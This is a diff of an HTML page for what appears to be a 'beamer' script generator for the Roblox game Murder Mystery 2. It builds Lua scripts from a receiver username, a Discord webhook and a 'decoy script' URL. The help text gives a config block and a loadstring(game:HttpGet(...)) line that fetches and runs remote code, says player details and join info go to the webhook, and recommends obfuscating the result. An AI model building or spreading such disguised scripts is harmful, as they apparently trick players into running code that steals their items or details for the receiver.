@@ -13,35 +13,37 @@
     </header>
 
     <main>
-      <!-- 📝 Form Input -->
-      <form id="scriptForm">
-        <input type="text" id="username" placeholder="Roblox Username" required />
-        <input type="url" id="github" placeholder="GitHub Raw URL" required />
-        <input type="url" id="webhook" placeholder="Discord Webhook URL" required />
-        <button type="submit">✨ Generate Script</button>
-      </form>
+      <!-- 🔁 Script Generator Page -->
+      <section id="scriptPage" class="page active">
+        <form id="scriptForm">
+          <input type="text" id="username" placeholder="Roblox Username" required />
+          <input type="url" id="github" placeholder="GitHub Raw URL" required />
+          <input type="url" id="webhook" placeholder="Discord Webhook URL" required />
+          <button type="submit">✨ Generate Script</button>
+        </form>
 
-      <!-- 📄 Output Script -->
-      <section id="output" class="output-card hidden">
-        <h2>✅ Your Lua Script</h2>
-        <pre id="scriptBox"></pre>
-        <div class="actions">
-          <button id="copyBtn">📋 Copy</button>
-          <button id="downloadBtn">⬇ Download</button>
-        </div>
+        <section id="output" class="output-card hidden">
+          <h2>✅ Your Lua Script</h2>
+          <pre id="scriptBox"></pre>
+          <div class="actions">
+            <button id="copyBtn">📋 Copy</button>
+            <button id="downloadBtn">⬇ Download</button>
+          </div>
+        </section>
+
+        <button class="toggle-help" onclick="switchToHelp()">📘 Help & Setup Guide</button>
       </section>
 
-      <!-- 📘 Help Section -->
-      <section class="help-card">
-        <button class="toggle-help" onclick="toggleHelp()">📘 Help & Setup Guide</button>
-        <div id="helpContent" class="">
+      <!-- 📘 Help Page -->
+      <section id="helpPage" class="page">
+        <div class="help-card">
+          <button class="back-button" onclick="switchToScript()">← Back</button>
           <h3>🌿 MM2 Beamer Script Setup</h3>
           <p>You can either manually enter your details or use our custom bot to generate your script automatically.</p>
           <hr/>
 
           <h4>🔧 Manual Setup</h4>
-          <p>Copy the following code and then update the placeholders with your actual information:</p>
-
+          <p>Copy and update this:</p>
 <pre><code>Config = {
   Receivers = {"username"},
   Webhook = "Webhook url",
@@ -50,28 +52,24 @@
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()</code></pre>
 
-          <h4>🔌 What to Fill In:</h4>
+          <h4>🔌 Fill These:</h4>
           <ul>
-            <li><strong>Receivers:</strong> Your Roblox username (⚠️ Not your display name)</li>
-            <li><strong>Webhook:</strong> A valid Discord webhook URL — this is where details and join info will be sent.</li>
-            <li><strong>ScriptURL:</strong> A raw GitHub URL for the decoy script.</li>
+            <li><strong>Receivers:</strong> Roblox username (⚠️ not display name)</li>
+            <li><strong>Webhook:</strong> Discord webhook</li>
+            <li><strong>ScriptURL:</strong> Raw GitHub link</li>
           </ul>
 
-          <p>⚠️ Make sure the URL is in raw format (<code>https://raw.githubusercontent.com/...</code>) and does not contain a loadstring if copied from online scripts.</p>
+          <p>⚠️ Raw URL must start with <code>https://raw.githubusercontent.com/...</code> and no loadstring inside it.</p>
 
-          <h4>🤖 Or Use Our Bot (Easier)</h4>
-          <p>Use the command: <code>/create_script</code> in <code>&lt;#1368630892032950354&gt;</code><br/>
-          Our bot will DM your custom script as text + downloadable file.</p>
-          
-          <p>🛑 Bot not online? Just <strong>@ us</strong> or DM with your issue!</p>
+          <h4>🤖 Bot Option</h4>
+          <p>Use <code>/create_script</code> in <code>&lt;#1368630892032950354&gt;</code> — the bot will DM your custom file and script.</p>
 
-          <h4>⚒️ Lua Obfuscator Recommendation</h4>
-          <p>We recommend using: <a href="https://luaobfuscator.com/" target="_blank">luaobfuscator.com</a> — or try Moose.</p>
+          <h4>⚒️ Obfuscator</h4>
+          <p><a href="https://luaobfuscator.com/" target="_blank">luaobfuscator.com</a> recommended — or try Moose.</p>
         </div>
       </section>
     </main>
 
-    <!-- 👣 Footer -->
     <footer>
       <p>Made By PRXJECT DEV 💜</p>
     </footer>
